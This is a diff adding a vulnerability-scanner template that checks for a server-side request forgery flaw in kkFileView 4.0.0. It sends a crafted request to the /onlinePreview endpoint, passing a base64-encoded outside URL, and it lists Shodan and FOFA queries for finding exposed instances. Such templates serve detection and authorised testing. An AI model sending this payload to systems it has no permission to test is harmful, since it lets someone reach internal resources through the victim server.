@@ -1,0 +1,39 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: data
+          regex:
+            - hidden id="textData" value="([A-Za-z0-9=]+)"\/>
+          type: regex
+      matchers:
+        - dsl:
+            - contains(base64_decode(data), "Disallow")
+          type: dsl
+      method: GET
+      path:
+        - '{{BaseURL}}/onlinePreview?url={{base64(''http://oast.fun/robots.txt'')}}'
+id: kkfileview-ssrf
+info:
+    author: Arm!tage
+    classification:
+        cpe: cpe:2.3:a:keking:kkfileview:*:*:*:*:*:*:*:*
+        cwe-id: CWE-918
+    description: |
+        kkFileView 4.0.0 is susceptible to server-side request forgery
+    metadata:
+        fofa-query: app="kkFileView"
+        max-request: 1
+        product: kkfileview
+        shodan-query: http.html:"kkFileView"
+        vendor: keking
+        verified: true
+    name: kkFileView 4.0.0 - Server-Side Request Forgery
+    reference:
+        - https://github.com/kekingcn/kkFileView/issues/296
+    severity: high
+    tags:
+        - ssrf
+        - kkfileview
+        - KkFileView
+        - kkFileView
